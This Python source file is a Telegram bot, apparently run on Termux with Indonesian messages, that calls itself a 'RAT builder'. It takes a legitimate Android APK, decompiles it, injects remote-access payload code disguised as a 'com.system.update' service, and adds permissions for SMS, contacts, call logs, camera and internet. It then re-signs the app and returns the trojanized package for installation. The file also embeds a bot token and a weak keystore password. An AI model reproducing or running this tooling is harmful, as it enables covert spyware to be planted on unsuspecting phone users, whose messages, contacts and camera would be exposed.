import os
import subprocess
import logging
import shutil
import uuid
import xml.etree.ElementTree as ET
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = "9153767226:AAG9WkQcikOjpFiwWKpQ8GkRC92xOUO92sc" 
ALLOWED_CHAT_ID = 8598136412 

WORK_DIR = "/data/data/com.termux/files/home/rat_builder"
KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
KEYSTORE_PASS = "123456"
KEY_ALIAS = "debugkey"
PAYLOAD_SMALI_DIR = f"{WORK_DIR}/payload_smali/com/system/update"

os.makedirs(WORK_DIR, exist_ok=True)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

def is_authorized(update: Update):
    return update.effective_chat.id == ALLOWED_CHAT_ID

def inject_manifest(manifest_path):
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    ns = '{http://schemas.android.com/apk/res/android}'
    
    permissions = ["android.permission.INTERNET", "android.permission.READ_SMS", "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA"]
    for perm in permissions:
        if not any(p.get(ns + 'name') == perm for p in root.findall('uses-permission')):
            ET.SubElement(root, 'uses-permission', {ns + 'name': perm})

    app = root.find('application')
    if app is not None:
        if not any(s.get(ns + 'name') == '.Payload' for s in app.findall('service')):
            ET.SubElement(app, 'service', {ns + 'name': '.Payload', ns + 'enabled': 'true', ns + 'exported': 'false'})
    tree.write(manifest_path, encoding='utf-8', xml_declaration=True)

async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
    await update.message.reply_text(f"⏳ Menerima APK: `{file_name}`\nSedang memproses inject otomatis...", parse_mode='Markdown')
    session_id = str(uuid.uuid4())[:8]
    session_dir = f"{WORK_DIR}/build_{session_id}"
    apk_out_dir = f"{session_dir}/decoded"
    apk_new_path = f"{session_dir}/modded.apk"
    
    try:
        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔧 [1/5] Membongkar APK...")
        subprocess.run(f"apktool d '{file_path}' -o '{apk_out_dir}' -f", shell=True, check=True, capture_output=True)

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="💉 [2/5] Menyuntikkan kode RAT...")
        target_smali_dir = f"{apk_out_dir}/smali/com/system/update"
        os.makedirs(target_smali_dir, exist_ok=True)
        if os.path.exists(PAYLOAD_SMALI_DIR):
            for smali_file in os.listdir(PAYLOAD_SMALI_DIR):
                if smali_file.endswith(".smali"):
                    shutil.copy(os.path.join(PAYLOAD_SMALI_DIR, smali_file), target_smali_dir)
        else:
            raise Exception("Folder payload_smali tidak ditemukan! Jalanin compile.sh dulu.")

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="📝 [3/5] Menyuntikkan Izin ke Manifest...")
        inject_manifest(f"{apk_out_dir}/AndroidManifest.xml")

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="📦 [4/5] Merakit ulang APK...")
        subprocess.run(f"apktool b '{apk_out_dir}' -o '{apk_new_path}'", shell=True, check=True, capture_output=True)

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔐 [5/5] Menandatangani APK...")
        signed_apk = f"{apk_new_path}.signed.apk"
        subprocess.run(f"zipalign -p -f 4 '{apk_new_path}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
        subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="✅ **BUILD SUKSES!** APK siap di-install:", parse_mode='Markdown')
        with open(signed_apk, "rb") as f:
            await context.bot.send_document(chat_id=ALLOWED_CHAT_ID, document=f, filename=f"MOD_{file_name}")
            
    except subprocess.CalledProcessError as e:
        error_msg = e.stderr.decode('utf-8') if e.stderr else str(e)
        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=f"❌ **GAGAL BUILD:**\n```\n{error_msg[:1000]}\n```", parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=f"❌ Error: {e}")
    finally:
        if os.path.exists(file_path): os.remove(file_path)
        if os.path.exists(session_dir): shutil.rmtree(session_dir)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    doc = update.message.document
    if not doc.file_name.endswith(".apk"):
        await update.message.reply_text("❌ File harus `.apk`")
        return
    await update.message.reply_text("⏳ Mendownload APK...")
    file = await context.bot.get_file(doc.file_id)
    temp_apk_path = f"{WORK_DIR}/{doc.file_name}"
    await file.download_to_drive(temp_apk_path)
    await process_apk(update, context, temp_apk_path, doc.file_name)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    banner = (
        "```\n"
        "███╗   ███╗██████╗ ██╗  ██╗ ██╗ ██╗  ███╗  ███╗       ██╗██████╗ \n"
        "████╗ ████║██╔══██╗██║  ██║ ██║ ██║ ██╔██╗ ██╔██╗      ██║██╔══██╗\n"
        "██╔████╔██║██████╔╝███████║ ███████║██╔╝██╗██╔╝██╗     ██║██║  ██║\n"
        "██║╚██╔╝██║██╔══██╗╚════██║ ╚════██║██████╔╝██████╔╝   ██║██║  ██║\n"
        "██║ ╚═╝ ██║██║  ██║      ██║      ██║╚═██╔═╝╚═██╔═╝    ██║██████╔╝\n"
        "╚═╝     ╚═╝╚═╝  ╚═╝      ╚═╝      ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═════╝ \n"
        "```\n"
        "✨ **RAT BUILDER SERVER** ✨\n"
        "Status: 🟢 Online (Termux Mode)\n\n"
        "Silakan kirim file `.apk` asli yang mau disusupi RAT."
    )
    await update.message.reply_text(banner, parse_mode='Markdown')

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.APK, handle_document))
    print("🤖 Bot Builder nyala...")
    app.run_polling()

if __name__ == '__main__':
    main()
